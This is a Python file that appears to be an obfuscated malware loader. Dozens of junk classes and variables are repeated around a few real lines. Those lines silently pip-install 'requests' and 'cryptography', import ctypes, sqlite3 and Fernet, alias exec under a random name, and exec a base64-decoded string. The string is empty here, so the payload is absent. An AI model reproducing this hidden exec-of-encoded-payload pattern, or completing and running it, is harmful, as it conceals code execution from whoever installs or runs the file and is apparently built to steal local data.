

from sys import executable, stderr
V4Kqxe0FwK = 31120738
class uDLk7FZozf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'vh96eMP8mC'
vsSSSHUaoF = 27258648
class ghEmTsaCaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class lC872hBdnD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
XLgV56i6rk = 65345199
AdE4zeAcdV = 59874983
{'username': 'BFuOo6h', 'age': 21}
w7xzVL30ZK = 22095475
["'zkpFEwgwSz'"]
jKrNI9pVbO = 93934353
dY4bAV5PME = 46643210
class ice47gTOJA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class tRP3iioyXy:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Yig4igs9Mh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class C60RfdGgxr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uybTyr3D14:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dlBvvLStm8 = 66884815
class mX2boBmjV9:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class aMavMSjyC1:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sm9RYTOnNz = 34971879
GF1H05zBcB = 68147466
import ctypes;import base64,subprocess,sqlite3,json,shutil
import time

requirements = [
    ["requests", "requests"],
    ["cryptography", "cryptography"]
]
for modl in requirements:
    try: __import__(modl[0])
    except:
        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
        time.sleep(3)
        

from json import loads, dumps
from urllib.request import Request, urlopen
try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography")

try:
    from cryptography.fernet import Fernet
except:
    subprocess.run("python -m pip install cryptography", shell=True)

try:
    import requests
except:
    subprocess.run("python -m pip install requests", shell=True)

import requests
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
V4Kqxe0FwK = 31120738
class uDLk7FZozf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'vh96eMP8mC'
vsSSSHUaoF = 27258648
class ghEmTsaCaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class lC872hBdnD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
XLgV56i6rk = 65345199
AdE4zeAcdV = 59874983
{'username': 'BFuOo6h', 'age': 21}
w7xzVL30ZK = 22095475
["'zkpFEwgwSz'"]
jKrNI9pVbO = 93934353
dY4bAV5PME = 46643210
class ice47gTOJA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class tRP3iioyXy:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Yig4igs9Mh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class C60RfdGgxr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uybTyr3D14:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dlBvvLStm8 = 66884815
class mX2boBmjV9:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class aMavMSjyC1:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sm9RYTOnNz = 34971879
GF1H05zBcB = 68147466
VaiovLmJKogwRqEKXVNPnzJSX2yAqjA5culZyq = exec
V4Kqxe0FwK = 31120738
class uDLk7FZozf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'vh96eMP8mC'
vsSSSHUaoF = 27258648
class ghEmTsaCaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class lC872hBdnD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
XLgV56i6rk = 65345199
AdE4zeAcdV = 59874983
{'username': 'BFuOo6h', 'age': 21}
w7xzVL30ZK = 22095475
["'zkpFEwgwSz'"]
jKrNI9pVbO = 93934353
dY4bAV5PME = 46643210
class ice47gTOJA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class tRP3iioyXy:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Yig4igs9Mh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class C60RfdGgxr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uybTyr3D14:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dlBvvLStm8 = 66884815
class mX2boBmjV9:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class aMavMSjyC1:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sm9RYTOnNz = 34971879
GF1H05zBcB = 68147466
import concurrent.futures
STJYtxgMb0D6cfzyBSkMtkZ7MonRWLJNWpnQMR=""
VaiovLmJKogwRqEKXVNPnzJSX2yAqjA5culZyq(base64.b64decode(STJYtxgMb0D6cfzyBSkMtkZ7MonRWLJNWpnQMR))
V4Kqxe0FwK = 31120738
class uDLk7FZozf:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
'vh96eMP8mC'
vsSSSHUaoF = 27258648
class ghEmTsaCaR:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class lC872hBdnD:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
XLgV56i6rk = 65345199
AdE4zeAcdV = 59874983
{'username': 'BFuOo6h', 'age': 21}
w7xzVL30ZK = 22095475
["'zkpFEwgwSz'"]
jKrNI9pVbO = 93934353
dY4bAV5PME = 46643210
class ice47gTOJA:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
class tRP3iioyXy:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class Yig4igs9Mh:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class C60RfdGgxr:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class uybTyr3D14:
    def __init__(self):
        self.data = True
    def get_data(self):
        return self.data
dlBvvLStm8 = 66884815
class mX2boBmjV9:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
class aMavMSjyC1:
    def __init__(self):
        self.data = False
    def get_data(self):
        return self.data
sm9RYTOnNz = 34971879
GF1H05zBcB = 68147466